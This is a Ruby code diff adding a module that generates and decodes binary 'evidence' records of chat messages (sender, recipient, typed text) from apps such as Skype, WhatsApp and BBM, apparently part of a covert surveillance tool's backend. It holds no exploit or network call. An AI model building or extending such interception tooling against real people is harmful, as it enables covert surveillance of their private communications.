@@ -7,6 +7,87 @@ require 'rcs-common/evidence/common'
 
 module RCS
 
+module ChatnewEvidence
+  include RCS::Tracer
+
+  ELEM_DELIMITER = 0xABADC0DE
+  KEYSTROKES = ["привет мир", "こんにちは世界", "Hello world!", "Ciao mondo!"]
+
+  PROGRAM_TYPE = {
+      0x01 => :skype,
+      0x02 => :facebook,
+      0x03 => :twitter,
+      0x04 => :gmail,
+      0x05 => :bbm,
+      0x06 => :whatsapp,
+  }
+
+  CHAT_INCOMING = 0x01
+
+  def content
+    program = [PROGRAM_TYPE.keys.sample].pack('L')
+    flags = [[0,1].sample].pack('L')
+    users = ["ALoR", "Bruno", "Naga", "Quez", "Tizio", "Caio"]
+    from = users.sample.to_utf16le_binary_null
+    to = users.sample.to_utf16le_binary_null
+
+    content = StringIO.new
+    t = Time.now.getutc
+    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
+    content.write program
+    content.write flags
+    content.write from
+    content.write to
+    content.write KEYSTROKES.sample.to_utf16le_binary_null
+    content.write [ ELEM_DELIMITER ].pack('L')
+
+    content.string
+  end
+
+  def generate_content
+    ret = Array.new
+    10.rand_times { ret << content() }
+    ret
+  end
+
+  def decode_content(common_info, chunks)
+    stream = StringIO.new chunks.join
+
+    until stream.eof?
+      tm = stream.read 36
+      info = Hash[common_info]
+      info[:da] = Time.gm(*(tm.unpack('L*')), 0)
+      info[:data] = Hash.new if info[:data].nil?
+
+      program = stream.read(4).unpack('L').first
+      info[:data][:program] = PROGRAM_TYPE[program]
+      #trace :debug, "CHAT Program #{info[:data][:program]}"
+
+      flags = stream.read(4).unpack('L').first
+      info[:data][:incoming] = (flags & CHAT_INCOMING != 0) ? 1 : 0
+      #trace :debug, "CHAT Incoming #{info[:data][:incoming]}"
+
+      from = stream.read_utf16le_string
+      info[:data][:from] = from.utf16le_to_utf8
+      #trace :debug, "CHAT from #{info[:data][:from]}"
+
+      rcpt = stream.read_utf16le_string
+      info[:data][:rcpt] = rcpt.utf16le_to_utf8
+      #trace :debug, "CHAT rcpt #{info[:data][:rcpt]}"
+
+      keystrokes = stream.read_utf16le_string
+      info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
+
+      delim = stream.read(4).unpack("L").first
+      raise EvidenceDeserializeError.new("Malformed CHATNEW (missing delimiter)") unless delim == ELEM_DELIMITER
+
+      yield info if block_given?
+    end
+    :delete_raw
+  end
+end # ChatEvidence
+
+
 module ChatEvidence
   include RCS::Tracer
 
